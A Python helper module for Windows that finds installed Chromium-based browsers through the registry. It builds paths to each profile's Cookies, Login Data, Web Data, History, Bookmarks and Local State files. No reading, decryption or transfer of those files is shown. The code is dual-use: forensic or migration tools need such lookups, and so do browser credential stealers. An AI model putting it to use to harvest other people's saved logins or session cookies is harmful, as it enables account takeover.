import os
import winreg
import ctypes
from typing import Optional, Tuple
from .config import BrowserType, FILE_TYPE_COOKIES, FILE_TYPE_HISTORY, FILE_TYPE_LOGIN_DATA, FILE_TYPE_WEB_DATA, FILE_TYPE_BOOKMARKS, FILE_TYPE_LOCAL_STATE

def duplicate_buffer(data: bytes) -> bytes:
    """Duplicate a buffer (simple copy in Python)."""
    return bytes(data)

def get_env_variable(var_name: str) -> Optional[str]:
    return os.environ.get(var_name)

def get_browser_reg_key(browser_type: str) -> Optional[str]:
    keys = {
        BrowserType.CHROME: r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\chrome.exe",
        BrowserType.EDGE: r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe",
        BrowserType.BRAVE: r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\brave.exe",
        BrowserType.OPERA: r"Software\Clients\StartMenuInternet\OperaStable\shell\open\command",
        BrowserType.OPERA_GX: r"Software\Clients\StartMenuInternet\OperaGXStable\shell\open\command",
        BrowserType.VIVALDI: r"Software\Microsoft\Windows\CurrentVersion\App Paths\vivaldi.exe",
        BrowserType.FIREFOX: r"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\firefox.exe",
    }
    return keys.get(browser_type)

def get_browser_path(browser_type: str) -> Optional[str]:
    """Resolve browser executable path from registry."""
    reg_key_path = get_browser_reg_key(browser_type)
    if not reg_key_path:
        return None

    # Try HKLM
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_key_path) as key:
            value, _ = winreg.QueryValueEx(key, "")
            if value:
                return value.strip('"')
    except OSError:
        pass

    # Try HKCU
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_key_path) as key:
            value, _ = winreg.QueryValueEx(key, "")
            if value:
                return value.strip('"')
    except OSError:
        pass
    
    # Specific fallbacks for Opera/Vivaldi if registry fails
    local_app_data = get_env_variable("LOCALAPPDATA")
    if not local_app_data:
        return None

    if browser_type == BrowserType.OPERA:
        path = os.path.join(local_app_data, r"Programs\Opera\opera.exe")
        if os.path.exists(path): return path
        
    if browser_type == BrowserType.OPERA_GX:
        path = os.path.join(local_app_data, r"Programs\Opera GX\opera.exe")
        if os.path.exists(path): return path

    if browser_type == BrowserType.VIVALDI:
        path = os.path.join(local_app_data, r"Vivaldi\Application\vivaldi.exe")
        if os.path.exists(path): return path

    return None

def get_chromium_user_data_path(browser_type: str) -> Optional[str]:
    local_app_data = get_env_variable("LOCALAPPDATA")
    app_data = get_env_variable("APPDATA")
    
    if not local_app_data or not app_data:
        return None

    paths = {
        BrowserType.CHROME: os.path.join(local_app_data, r"Google\Chrome\User Data"),
        BrowserType.EDGE: os.path.join(local_app_data, r"Microsoft\Edge\User Data"),
        BrowserType.BRAVE: os.path.join(local_app_data, r"BraveSoftware\Brave-Browser\User Data"),
        BrowserType.OPERA: os.path.join(app_data, r"Opera Software\Opera Stable"),
        BrowserType.OPERA_GX: os.path.join(app_data, r"Opera Software\Opera GX Stable"),
        BrowserType.VIVALDI: os.path.join(local_app_data, r"Vivaldi\User Data"),
    }
    return paths.get(browser_type)

def get_browser_data_file(browser_type: str, file_type: str) -> Optional[str]:
    base_path = get_chromium_user_data_path(browser_type)
    if not base_path:
        return None
    
    # Default profile path usually
    profile = "Default" 
    
    if file_type == FILE_TYPE_LOCAL_STATE:
        return os.path.join(base_path, "Local State")
        
    rel_paths = {
        FILE_TYPE_COOKIES: os.path.join(profile, r"Network\Cookies"),
        FILE_TYPE_HISTORY: os.path.join(profile, r"History"),
        FILE_TYPE_LOGIN_DATA: os.path.join(profile, r"Login Data"),
        FILE_TYPE_WEB_DATA: os.path.join(profile, r"Web Data"),
        FILE_TYPE_BOOKMARKS: os.path.join(profile, r"Bookmarks"),
    }
    
    rel_path = rel_paths.get(file_type)
    if not rel_path:
        return None
        
    full_path = os.path.join(base_path, rel_path)
    if os.path.exists(full_path):
        return full_path
    
    return None
